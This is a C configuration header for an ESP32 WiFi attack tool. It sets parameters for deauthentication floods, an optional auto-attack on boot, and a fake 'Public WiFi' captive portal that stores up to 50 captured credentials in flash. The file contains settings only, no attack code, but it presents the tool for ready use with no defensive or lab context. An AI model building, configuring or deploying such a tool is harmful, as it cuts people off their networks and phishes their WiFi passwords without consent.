/*
 * ESP32 DeAuth Tool - Configuration File
 *
 * Customize your tool settings here
 */

#ifndef CONFIG_H
#define CONFIG_H

// ========================================
// ACCESS POINT CONFIGURATION
// ========================================
// Change these to customize your AP
#define AP_SSID "ESP32_Control"      // Your AP name
#define AP_PASS "deauth123"           // Your AP password (min 8 chars)

// Network configuration
#define AP_CHANNEL 1                  // WiFi channel (1-13)
#define AP_HIDDEN false               // Hide AP SSID (true/false)
#define AP_MAX_CLIENTS 4              // Max connected clients

// ========================================
// SERVER CONFIGURATION
// ========================================
#define DNS_PORT 53                   // DNS server port
#define WEB_PORT 80                   // Web server port

// ========================================
// ATTACK CONFIGURATION
// ========================================
// Default attack parameters
#define DEFAULT_DEAUTH_PACKETS 20     // Packets per AP (1-100)
#define DEFAULT_DEAUTH_DELAY 100      // Delay in ms (10-1000)
#define DEFAULT_DEAUTH_REASON 0x07    // Deauth reason code

// Auto-attack on boot (true = start attacking immediately)
#define AUTO_ATTACK_ON_BOOT false     // Set to true for plug-and-play

// Auto-attack mode (if AUTO_ATTACK_ON_BOOT is true)
// Options: MODE_AUTO_DEAUTH, MODE_SELECTIVE_DEAUTH, MODE_CAPTIVE_PORTAL
#define AUTO_ATTACK_MODE MODE_AUTO_DEAUTH

// ========================================
// CAPTIVE PORTAL CONFIGURATION
// ========================================
// Fake network name shown in captive portal
#define CAPTIVE_PORTAL_TITLE "WiFi Authentication Required"
#define CAPTIVE_PORTAL_NETWORK "Public WiFi"

// ========================================
// SECURITY CONFIGURATION
// ========================================
// Enable/disable features
#define ENABLE_DEAUTH true            // Enable deauth attacks
#define ENABLE_CAPTIVE_PORTAL true    // Enable captive portal
#define ENABLE_CREDENTIAL_STORAGE true // Save credentials to flash

// Maximum stored credentials (to prevent memory overflow)
#define MAX_STORED_CREDENTIALS 50

// ========================================
// DEBUG CONFIGURATION
// ========================================
#define DEBUG_MODE true               // Enable serial debug output
#define SERIAL_BAUD 115200            // Serial monitor baud rate

// Verbose logging (shows more details)
#define VERBOSE_LOGGING false

// ========================================
// ADVANCED CONFIGURATION
// ========================================
// Scan configuration
#define SCAN_TIMEOUT 5000             // Network scan timeout (ms)
#define AUTO_RESCAN_INTERVAL 30000    // Auto-rescan every X ms (0 = disabled)

// WiFi configuration
#define WIFI_TRANSMIT_POWER WIFI_POWER_19_5dBm  // TX power (higher = stronger signal)

// Web interface auto-refresh interval (ms)
#define STATUS_REFRESH_INTERVAL 3000

// ========================================
// COLOR THEME (for future use)
// ========================================
#define THEME_PRIMARY "#667eea"
#define THEME_SECONDARY "#764ba2"
#define THEME_SUCCESS "#4facfe"
#define THEME_DANGER "#f5576c"
#define THEME_WARNING "#fee140"

#endif // CONFIG_H
